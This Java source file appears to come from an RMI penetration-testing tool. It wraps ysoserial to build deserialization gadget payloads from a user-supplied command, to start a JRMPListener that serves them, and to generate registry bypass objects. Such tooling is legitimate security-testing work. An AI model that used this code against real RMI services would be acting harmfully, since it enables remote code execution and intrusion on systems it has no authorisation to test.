package de.qtc.rmg.utils;

import java.io.File;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.net.InetAddress;
import java.net.MalformedURLException;
import java.net.NetworkInterface;
import java.net.ServerSocket;
import java.net.SocketException;
import java.net.URL;
import java.net.URLClassLoader;
import java.net.UnknownHostException;
import java.util.Arrays;

import javax.net.ServerSocketFactory;

import de.qtc.rmg.internal.ExceptionHandler;
import de.qtc.rmg.io.Logger;
import de.qtc.rmg.operations.RegistryClient;

public class YsoIntegration {

    private static String[] bypassGadgets = new String[]{"JRMPClient2", "AnTrinh"};

    private static Object generateBypassGadget(String command)
    {
        Object payloadObject = null;
        String[] split = command.split(":");

        if(split.length != 2 || !split[1].matches("\\d+")) {
            ExceptionHandler.invalidListenerFormat(true);
        }

        try {
            payloadObject = RegistryClient.generateBypassObject(split[0], Integer.valueOf(split[1]));
        } catch (Exception e) {
            ExceptionHandler.unexpectedException(e, "bypass object", "generation", true);
        }

        return payloadObject;
    }

    private static URLClassLoader getClassLoader(String ysoPath) throws MalformedURLException
    {
        File ysoJar = new File(ysoPath);

        if( !ysoJar.exists() ) {
            ExceptionHandler.internalError("RMGUtils.createListener", "Error: " + ysoJar.getAbsolutePath() + " does not exist.");
        }

        return new URLClassLoader(new URL[] {ysoJar.toURI().toURL()});
    }

    private static InetAddress getLocalAddress(String host)
    {

        InetAddress addr = null;

        try {
            addr = InetAddress.getByName(host);
            if (!addr.isAnyLocalAddress() && !addr.isLoopbackAddress())
                NetworkInterface.getByInetAddress(addr);

        } catch (SocketException | UnknownHostException e) {
            Logger.eprintlnMixedYellow("Specified address", host, "seems not to be available on your host.");
            Logger.eprintlnMixedBlue("Listener address is expected to be", "bound locally.");
            ExceptionHandler.showStackTrace(e);
            RMGUtils.exit();
        }

        return addr;
    }

    public static void createJRMPListener(String ysoPath, String host, int port, String gadget, String command)
    {
        try {
            InetAddress bindAddress = getLocalAddress(host);
            URLClassLoader ucl = getClassLoader(ysoPath);

            Class<?> yso = Class.forName("ysoserial.exploit.JRMPListener", true, ucl);
            Constructor<?> cons = yso.getConstructor(new Class[] {int.class, Object.class});
            Method runMethod = yso.getDeclaredMethod("run", new Class[] {});

            Field serverSocket = yso.getDeclaredField("ss");
            serverSocket.setAccessible(true);

            Logger.printMixedYellow("Creating a", "JRMPListener", "on ");
            Logger.printlnPlainBlue(host + ":" + port + ".");

            Object payloadObject = getPayloadObject(ysoPath, gadget, command);
            Object jrmpListener = cons.newInstance(port, payloadObject);

            ServerSocket serverSock = (ServerSocket) serverSocket.get(jrmpListener);
            serverSock.close();

            serverSock = ServerSocketFactory.getDefault().createServerSocket(port, 0, bindAddress);
            serverSocket.set(jrmpListener, serverSock);

            Logger.printlnMixedBlue("Handing off to", "ysoserial...");

            runMethod.invoke(jrmpListener, new Object[] {});
            System.exit(0);

        } catch( Exception e ) {
            ExceptionHandler.unexpectedException(e, "JRMPListener", "creation", true);
        }
    }

    public static Object getPayloadObject(String ysoPath, String gadget, String command)
    {
        if(Arrays.asList(bypassGadgets).contains(gadget)) {
            return generateBypassGadget(command);
        }

        Object ysoPayload = null;

        try {
            URLClassLoader ucl = getClassLoader(ysoPath);

            Class<?> yso = Class.forName("ysoserial.payloads.ObjectPayload$Utils", true, ucl);
            Method method = yso.getDeclaredMethod("makePayloadObject", new Class[] {String.class, String.class});

            Logger.print("Creating ysoserial payload...");
            ysoPayload = method.invoke(null, new Object[] {gadget, command});

        } catch( Exception  e) {
            ExceptionHandler.unexpectedException(e, "gadget", "generation", true);
        }

        Logger.printlnPlain(" done.");
        return ysoPayload;
    }
}
